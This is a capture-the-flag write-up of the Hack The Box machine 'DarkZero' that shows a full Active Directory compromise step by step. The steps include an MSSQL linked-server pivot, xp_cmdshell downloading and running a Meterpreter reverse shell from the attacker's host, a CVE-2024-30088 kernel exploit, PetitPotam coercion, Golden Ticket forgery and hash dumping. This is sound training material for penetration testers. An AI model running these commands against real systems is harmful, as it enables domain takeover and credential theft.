---
title: "DarkZero"
date: 2025-10-05
tags: [windows, active-directory, mssql, kerberos, CVE-2024-30088, golden-ticket, rubeus, privesc]
difficulty: hard
platform: HTB
description: "Active Directory box featuring MSSQL lateral movement across two domains, kernel exploitation (CVE-2024-30088) via Metasploit, and Golden Ticket via Rubeus + PetitPotam to compromise the forest."
featured: true
---

## Overview

![DarkZero](/images/writeups/darkzero/logo.png)

| Field | Details |
|---|---|
| **Machine** | DarkZero |
| **OS** | Windows |
| **Difficulty** | Hard |
| **Status** | Active |

## TL;DR

- Initial access via provided creds: `john.w / RFulUtONCOL!`
- Two domains discovered: `darkzero.htb` and `darkzero.ext`
- MSSQL server access → linked server pivot to DC02 via `use_link`
- Enable `xp_cmdshell` → upload Meterpreter shell as `svc_sql`
- winPEAS flags CVE-2024-30088 → Metasploit exploit → `NT AUTHORITY\SYSTEM` → `user.txt`
- Rubeus + PetitPotam → catch DC01 TGT → secretsdump krbtgt AES key → Golden Ticket as DC01$ → dump Administrator hash → `evil-winrm` → `root.txt`

## Tools Used

- nmap, crackmapexec, bloodhound-python, BloodHound, neo4j, impacket-mssqlclient, msfvenom, msfconsole, winPEAS, Rubeus, PetitPotam, impacket-secretsdump, impacket-ticketer, evil-winrm

## Setup / Notes

```
Credentials: john.w / RFulUtONCOL!

Time sync is critical for Kerberos:
sudo ntpdate <target-ip>

Add to /etc/hosts:
10.129.13.116   DC01.darkzero.htb darkzero.htb
```

---

## Recon

```bash
nmap -sC -sV 10.129.13.116
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb)
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
```

Key findings: port 1433 (MSSQL), port 3268 (Global Catalog → likely multi-domain), domain `darkzero.htb` on `DC01`.

---

## Enumeration

### SMB Check

```bash
crackmapexec smb 10.129.110.78 -u john.w -p 'RFulUtONCOL!' --shares
```

![crackmapexec SMB — no interesting shares](/images/writeups/darkzero/1.png)

Nothing useful. Generic shares only. Moving on to BloodHound.

### BloodHound Collection

```bash
bloodhound-python -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb -ns 10.129.110.78 -c All
```

![bloodhound-python collecting data](/images/writeups/darkzero/2.png)

You may see `KRB_AP_ERR_SKEW` (clock skew). Sync time with:

```bash
sudo ntpdate 10.129.110.78
```

The collection produces JSON files:

![JSON files output](/images/writeups/darkzero/3.png)

Start the backend and import:

```bash
sudo neo4j start
bloodhound
```

![neo4j started](/images/writeups/darkzero/4.png)

![BloodHound login screen](/images/writeups/darkzero/5.png)

Import the JSON files via the upload button (3rd icon):

![BloodHound import](/images/writeups/darkzero/6.png)

BloodHound reveals a second domain: `darkzero.ext`.

![darkzero.ext visible in BloodHound](/images/writeups/darkzero/7.png)

### MSSQL Access

We have creds and port 1433 is open — try authenticating:

```bash
impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!@10.129.110.78' -windows-auth
```

![MSSQL login as john.w](/images/writeups/darkzero/8.png)

We're in. Enumerate linked servers:

```sql
SELECT name FROM sys.servers
```

![sys.servers shows DC02.darkzero.ext](/images/writeups/darkzero/9.png)

There's a linked server pointing to `DC02.darkzero.ext`. Running `help` inside impacket-mssqlclient gives us the next clue — it shows the commands we can perform, and we can see that we can link to another server using `use_link`:

```
use_link "DC02.darkzero.ext"
```

![Linked to DC02](/images/writeups/darkzero/11.png)

We've hopped onto DC02. Enumerating it doesn't turn up anything dramatic, but looking back at the help menu we see we can execute `cmd` using `xp_cmdshell` — which means we can run commands directly on the server and even get a reverse shell.

---

## Exploit

### Enable xp_cmdshell

Trying to run `xp_cmdshell` directly throws an access error:

![xp_cmdshell blocked](/images/writeups/darkzero/12.png)

Unlock it:

```sql
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Now use `xp_cmdshell` to download and run a Meterpreter payload. Generate the exe first:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o meterp_x64_tcp.exe
```

Host it:

```bash
python3 -m http.server 8000
```

Download and store it on the target:

```sql
xp_cmdshell curl 10.10.14.138:8000/meterp_x64_tcp.exe -o C:\Windows\Temp\meterp_x64_tcp.exe
```

![File transferred successfully](/images/writeups/darkzero/13.png)

Set up the listener in msfconsole:

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
```

![msfconsole listener ready](/images/writeups/darkzero/14.png)

Run the listener, then trigger execution:

```sql
EXEC xp_cmdshell 'C:\Windows\Temp\meterp_x64_tcp.exe';
```

![Meterpreter session opened as svc_sql](/images/writeups/darkzero/15.png)

We have Meterpreter as `darkzero-ext\svc_sql`. Typing `getuid` confirms: `Server username: darkzero-ext\svc_sql`. Check privileges:

![whoami /priv — limited privileges](/images/writeups/darkzero/16.png)

Privileges are very limited. Normally we'd go straight to `Users\Administrator\Desktop` for `user.txt`, but it's not there — we're operating as the service account `svc_sql` and need to elevate. Time to enumerate the server further.

---

## Privilege Escalation — CVE-2024-30088

### winPEAS

Upload and run winPEAS:

```
cd C:\Users\svc_sql\AppData\local\temp
upload /path/to/winPEASx64.exe
```

![winPEAS uploaded](/images/writeups/darkzero/17.png)

```powershell
dir
winPEASx64.exe
```

![Confirming winPEAS is in temp folder](/images/writeups/darkzero/18.png)

![winPEAS running](/images/writeups/darkzero/19.png)

winPEAS uses a color legend — focus on red:

![winPEAS legend](/images/writeups/darkzero/20.png)

One finding stands out: `kernel32` flagged as vulnerable.

![kernel32 flagged by winPEAS](/images/writeups/darkzero/21.png)

This is **CVE-2024-30088** — a Windows kernel race condition for local privilege escalation to SYSTEM. A quick search leads to [attackerkb.com/topics/y8MOqV0WPr/cve-2024-30088](https://attackerkb.com/topics/y8MOqV0WPr/cve-2024-30088) — *Exploitability: High*. We use Metasploit's built-in module to exploit it.

### Exploit

Background the current session and use Metasploit's module:

```
background
use exploit/windows/local/cve_2024_30088_authz_basep
set LHOST tun0
set LPORT 4444
show sessions
set session <Id>
run
```

![CVE-2024-30088 exploit running](/images/writeups/darkzero/22.png)

Now `whoami` returns `nt authority\system`. Navigate to Administrator's desktop:

![user.txt found on Administrator Desktop](/images/writeups/darkzero/23.png)

`user.txt` captured.

---

## Post-Exploitation — Golden Ticket

With SYSTEM on DC02, the next goal is compromising `darkzero.htb` (DC01) to get `root.txt`.

### Catch DC01 TGT with Rubeus

Upload Rubeus and monitor for TGTs:

```
upload /path/to/Rubeus.exe
shell
Rubeus.exe monitor /interval:5 /nowrap
```

![Rubeus monitoring for TGTs](/images/writeups/darkzero/24.png)

We see tickets for `svc_sql` and `Administrator` but not DC01. Trigger DC01's authentication using PetitPotam from your attacker machine:

```bash
python3 /opt/tools/PetitPotam.py \
  -d darkzero.htb \
  -u 'john.w' -p 'RFulUtONCOL!' \
  DC02.darkzero.ext DC01.darkzero.htb \
  -pipe all
```

DC01's TGT appears in Rubeus:

![DC01 TGT captured](/images/writeups/darkzero/25.png)

Copy the `Base64EncodedTicket`, save to a file, and convert:

```bash
nano ticket.b64   # paste the ticket
base64 -d ticket.b64 > dc01.kirbi
impacket-ticketConverter dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache
```

### Dump krbtgt AES Key

```bash
secretsdump.py -k -no-pass -dc-ip <ip> -just-dc-user DC01$ @darkzero.htb
```

![secretsdump output — krbtgt AES key](/images/writeups/darkzero/26.png)

### Forge Golden Ticket as DC01$

```bash
ticketer.py \
  -aesKey 25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941 \
  -domain-sid S-1-5-21-1152179935-589108180-1989892463 \
  -domain DARKZERO.HTB \
  -user-id 1000 DC01$
```

> The `aesKey` signs the forged TGT. The `domain-sid` + `user-id` place it in the right domain context. `DC01$` is the machine account we're impersonating.

![Golden Ticket (DC01$.ccache) generated](/images/writeups/darkzero/27.png)

### Dump Administrator Hash

```bash
export KRB5CCNAME=DC01$.ccache
secretsdump.py -k -no-pass -dc-ip <ip> -just-dc-user Administrator @darkzero.htb
```

![Administrator NTLM hash extracted](/images/writeups/darkzero/28.png)

### Root via evil-winrm

```bash
evil-winrm -i <ip> -u Administrator -H <NTLM_hash>
```

![root.txt captured as Administrator](/images/writeups/darkzero/root.png)

---

## Lessons Learned

- Always enumerate for multi-domain environments — linked MSSQL servers can be a direct bridge between domains
- `xp_cmdshell` via `sysadmin` SQL auth gives immediate code execution; restrict SQL server privileges in production
- CVE-2024-30088 shows kernel vulnerabilities remain a reliable SYSTEM path — keep servers patched
- PetitPotam coerces DC authentication — Golden Ticket attacks persist indefinitely once you have the krbtgt key
- Time sync (`ntpdate`) is non-negotiable for Kerberos — anything over 5 minutes skew kills the auth

## References

- [Impacket](https://github.com/fortra/impacket)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [winPEAS](https://github.com/carlospolop/PEASS-ng)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [PetitPotam](https://github.com/topotam/PetitPotam)
- [CVE-2024-30088](https://attackerkb.com/topics/y8MOqV0WPr/cve-2024-30088)
